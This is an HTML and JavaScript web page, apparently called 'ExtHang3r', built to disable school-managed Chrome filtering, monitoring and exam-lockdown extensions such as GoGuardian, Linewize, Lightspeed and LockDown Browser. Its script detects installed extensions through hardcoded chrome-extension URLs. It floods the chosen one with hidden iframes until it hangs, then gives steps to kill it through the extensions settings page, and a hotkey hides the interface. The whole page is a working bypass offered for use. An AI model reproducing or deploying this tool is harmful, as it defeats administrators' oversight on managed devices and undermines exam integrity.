<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Forsyth Linewize – All Extensions Mode</title>
  <link rel="shortcut icon" href="https://raw.githubusercontent.com/Blobby-Boi/ExtHang3r/refs/heads/main/favicon.png" type="image/png">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
  <style>
    *, *::before, *::after { box-sizing: border-box; }
    body {
      font-family: 'Inter', sans-serif;
      background: linear-gradient(135deg, #001f4d, #003d99, #005f8e);
      margin: 0;
      min-height: 100vh;
      color: #f0f4ff;
    }
    header {
      background-color: rgba(0, 20, 60, 0.92);
      color: white;
      text-align: center;
      padding: 18px 24px;
      box-shadow: 0 2px 12px rgba(0,0,0,0.5);
      position: sticky;
      top: 0;
      z-index: 100;
    }
    header h1 {
      margin: 0;
      font-size: 1.6rem;
      font-weight: 700;
      letter-spacing: 0.5px;
    }
    header p {
      margin: 4px 0 0;
      font-size: 0.85rem;
      color: #7eb8f7;
      font-weight: 400;
    }
    footer {
      background-color: rgba(0, 20, 60, 0.92);
      color: #7eb8f7;
      text-align: center;
      padding: 14px 20px;
      font-size: 0.82rem;
      margin-top: 40px;
    }
    .container {
      max-width: 820px;
      margin: 60px auto 0;
      padding: 30px;
      background: rgba(0, 10, 40, 0.75);
      border-radius: 14px;
      box-shadow: 0 12px 36px rgba(0,0,0,0.45);
      border: 1px solid rgba(100, 160, 255, 0.15);
    }
    label {
      display: block;
      margin-top: 16px;
      margin-bottom: 4px;
      font-size: 0.9rem;
      font-weight: 600;
      color: #b3d4ff;
    }
    select, input[type="range"] {
      font-family: inherit;
      font-size: 15px;
      padding: 11px 14px;
      width: 100%;
      border-radius: 8px;
      border: 1px solid rgba(100,160,255,0.25);
      background-color: rgba(0, 40, 100, 0.55);
      color: #fff;
      outline: none;
      transition: border-color 0.2s;
    }
    select:focus, input[type="range"]:focus {
      border-color: #4da3ff;
    }
    .slider-row {
      display: flex;
      align-items: center;
      gap: 12px;
    }
    .slider-row input[type="range"] {
      flex: 1;
    }
    #iframeCountValue {
      min-width: 52px;
      text-align: right;
      font-weight: 600;
      color: #7eb8f7;
      font-size: 0.95rem;
    }
    .checkbox-row {
      margin-top: 16px;
      display: flex;
      align-items: center;
      gap: 8px;
      font-size: 0.9rem;
      color: #b3d4ff;
    }
    .checkbox-row input[type="checkbox"] {
      width: 16px;
      height: 16px;
      accent-color: #4da3ff;
      cursor: pointer;
    }
    .btn {
      display: block;
      width: 100%;
      font-family: inherit;
      font-size: 15px;
      font-weight: 600;
      margin-top: 16px;
      padding: 13px;
      border-radius: 8px;
      border: none;
      cursor: pointer;
      transition: background-color 0.2s, transform 0.1s;
    }
    .btn:active { transform: scale(0.98); }
    #hangButton {
      background-color: #1a6fdb;
      color: #fff;
    }
    #hangButton:hover { background-color: #1560c2; }
    #killButton {
      display: none;
      background-color: #c0392b;
      color: #fff;
    }
    #killButton:hover { background-color: #a93226; }
    #killExtensionText {
      margin-top: 16px;
      font-size: 0.9rem;
      color: #b3d4ff;
      line-height: 1.5;
    }
    .overlay {
      position: fixed;
      display: none;
      justify-content: center;
      align-items: center;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0, 5, 25, 0.88);
      z-index: 9999;
      color: white;
      font-size: 22px;
      font-weight: 600;
      flex-direction: column;
      gap: 16px;
    }
    .spinner {
      border: 6px solid rgba(255, 255, 255, 0.2);
      border-top: 6px solid #4da3ff;
      border-radius: 50%;
      width: 52px;
      height: 52px;
      animation: spin 0.9s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <header>
    <h1>Forsyth Linewize</h1>
    <p>All Extensions Mode</p>
  </header>
  <div class="container" id="mainUI">
    <label for="iframeSelect">Select an extension to hang:</label>
    <select id="iframeSelect"></select>

    <label for="iframeCountSlider">Iframe Intensity:</label>
    <div class="slider-row">
      <input type="range" id="iframeCountSlider" min="10" max="300" step="1" value="50">
      <span id="iframeCountValue">50</span>
    </div>

    <div class="checkbox-row">
      <input type="checkbox" id="safeMode" checked>
      <label for="safeMode" style="margin:0;">Safe Mode</label>
    </div>

    <button id="hangButton" class="btn" onclick="warning()">Hang Extension!</button>
    <button id="killButton" class="btn" onclick="openExtensionPopup()">Kill Extension!</button>

    <div id="killExtensionText"></div>
  </div>
  <div class="overlay" id="overlay">
    <div class="spinner"></div>
    Hanging… Please wait.
  </div>
  <footer><p>Made by Blobby Boi and justanewplayer19.</p></footer>

  <script>
    const extensionList = {
      "GoGuardian": "chrome-extension://haldlgldplgnggkjaafhelgiaglafanh/youtube_injection.js",
      "LANSchool": "chrome-extension://baleiojnjpgeojohhhfbichcodgljmnj/blocked.html",
      "Linewize": "chrome-extension://ddfbkhpmcdbciejenfcolaaiebnjcbfc/background/assets/pages/default-blocked.html",
      "Blocksi": "chrome-extension://ghlpmldmjjhmdgmneoaibbegkjjbonbk/pages/blockPage.html",
      "FortiGuard": "chrome-extension://igbgpehnbmhgdgjbhkkpedommgmfbeao/youtube_injection.js",
      "Cisco Umbrella": "chrome-extension://jcdhmojfecjfmbdpchihbeilohgnbdci/blocked.html",
      "ContentKeeper": "chrome-extension://jdogphakondfdmcanpapfahkdomaicfa/img/ckauth19x.png",
      "CK-Authenticator G3": "chrome-extension://odoanpnonilogofggaohhkdkdgbhdljp/img/ckauth19x.png",
      "Hapara (2nd ID)": "chrome-extension://kbohafcopfpigkjdimdcdgenlhkmhbnc/blocked.html",
      "Hapara (1st ID)": "chrome-extension://aceopacgaepdcelohobicpffbbejnfac/blocked.html",
      "iboss": "chrome-extension://kmffehbidlalibfeklaefnckpidbodff/restricted.html",
      "Lightspeed Digital Insight Agent": "chrome-extension://njdniclgegijdcdliklgieicanpmcngj/js/wasm_exec.js",
      "Lightspeed Filter Agent": "chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/icon-128.png",
      "Lightspeed Classroom": "chrome-extension://kkbmdgjggcdajckdlbngdjonpchpaiea/assets/icon-classroom-128.png",
      "InterCLASS Filtering Service": "chrome-extension://jbddgjglgkkneonnineaohdhabjbgopi/pages/message-page.html",
      "InterSafe GatewayConnection Agent": "chrome-extension://ecjoghccnjlodjlmkgmnbnkdcbnjgden/resources/options.js",
      "LoiLo Web Filters": "chrome-extension://pabjlbjcgldndnpjnokjakbdofjgnfia/image/allow_icon/shield_green_128x128.png",
      "Gopher Buddy": "chrome-extension://cgbbbjmgdpnifijconhamggjehlamcif/images/gopher-buddy_128x128_color.png",
      "LanSchool Web Helper": "chrome-extension://honjcnefekfnompampcpmcdadibmjhlk/blocked.html",
      "IMTLazarus": "chrome-extension://cgigopjakkeclhggchgnhmpmhghcbnaf/models/model.json",
      "Impero Backdrop": "chrome-extension://jjpmjccpemllnmgiaojaocgnakpmfgjg/licenses.html",
      "Mobile Guardian": "chrome-extension://fgmafhdohjkdhfaacgbgclmfgkgokgmb/block.html",
      "NetSupport School Student": "chrome-extension://gcjpefhffmcgplgklffgbebganmhffje/_locales/lt/messages.json",
      "classroom.cloud Student": "chrome-extension://mpkdoimpgkhjcicmhmlmgboelebflpla/_locales/lt/messages.json",
      "Lockdown Browser": "chrome-extension://fogjeanjfbiombghnmkmmophfeccjdki/manifest.json",
      "Linewize Filter": "chrome-extension://ifinpabiejbjobcphhaomiifjibpkjlf/background/assets/pages/default-blocked.html",
      "Borderless Classroom Student": "chrome-extension://kdpgkligilplaanoablcpjahjjeghcl/pages/blockPage.html",
      "LockDown Browser AP Classroom Edition": "chrome-extension://djpknfecbncogekjnjppojlaipeobkmo/assets/images/icon_128.png",
      "Lugus School": "chrome-extension://eoobggamkobbcpiojefejfglbfcacgca/assets/images/icon_128.png"
    };

    document.addEventListener("DOMContentLoaded", async () => {
      const select = document.getElementById("iframeSelect");
      const valueDisplay = document.getElementById("iframeCountValue");
      const slider = document.getElementById("iframeCountSlider");
      valueDisplay.textContent = slider.value;
      slider.addEventListener("input", () => valueDisplay.textContent = slider.value);

      for (const [name, url] of Object.entries(extensionList)) {
        if (await checkExtensionURL(url)) {
          const option = document.createElement("option");
          option.value = url;
          option.textContent = name;
          select.appendChild(option);
        }
      }

      if (!select.options.length) {
        const opt = document.createElement("option");
        opt.textContent = "No compatible extensions detected";
        select.appendChild(opt);
        document.getElementById("hangButton").style.display = "none";
      }
    });

    async function checkExtensionURL(url) {
      try { return (await fetch(url)).ok; } catch { return false; }
    }

    const BATCH_SIZE = 3;
    const BATCH_INTERVAL_MS = 300;

    function spawnIframes(src, count, safe) {
      const container = document.createElement("div");
      container.style.cssText = "position:fixed;top:-9999px;left:-9999px;width:300px;height:300px;overflow:hidden;pointer-events:none;";
      document.body.appendChild(container);

      // Unsafe mode spawns 3x iframes to increase load on the target extension
      const totalTarget = safe ? count : count * 3;
      let spawned = 0;

      function spawnBatch() {
        const n = Math.min(BATCH_SIZE, totalTarget - spawned);
        for (let i = 0; i < n; i++) {
          const iframe = document.createElement("iframe");
          iframe.src = src;
          iframe.style.cssText = "width:300px;height:300px;border:none;";
          container.appendChild(iframe);
          spawned++;
        }
        if (spawned < totalTarget) setTimeout(spawnBatch, BATCH_INTERVAL_MS);
      }
      spawnBatch();
    }

    function warning() {
      const overlay = document.getElementById("overlay");
      overlay.style.display = "flex";
      const select = document.getElementById("iframeSelect");
      const selectedURL = select.value;
      const count = parseInt(document.getElementById("iframeCountSlider").value);
      const safe = document.getElementById("safeMode").checked;

      spawnIframes(selectedURL, count, safe);

      setTimeout(() => {
        document.getElementById("killExtensionText").innerHTML = `Extension <strong>${select.options[select.selectedIndex].text}</strong> has been hung. Now click the red button below.`;
        overlay.style.display = "none";
        document.getElementById("killButton").style.display = "block";
        document.getElementById("hangButton").style.display = "none";
        document.getElementById("iframeSelect").style.display = "none";
        document.getElementById("killButton").setAttribute("data-url", selectedURL);
      }, 10000);
    }

    function openExtensionPopup() {
      const url = document.getElementById("killButton").getAttribute("data-url");
      const extId = url.split("/")[2];
      window.location.href = url;
      document.getElementById("killExtensionText").innerHTML = `
        Keep this tab open, then go to <strong>chrome://extensions/?id=${extId}</strong> and toggle "Allow access to file URLs" twice.
        The extension should now be disabled.
      `;
      document.getElementById("killButton").style.display = "none";
    }

    window.addEventListener("keydown", (e) => {
      if (e.altKey && e.key.toLowerCase() === 'h') {
        document.getElementById("mainUI").classList.toggle("hidden-ui");
      }
    });
  </script>
</body>
</html>
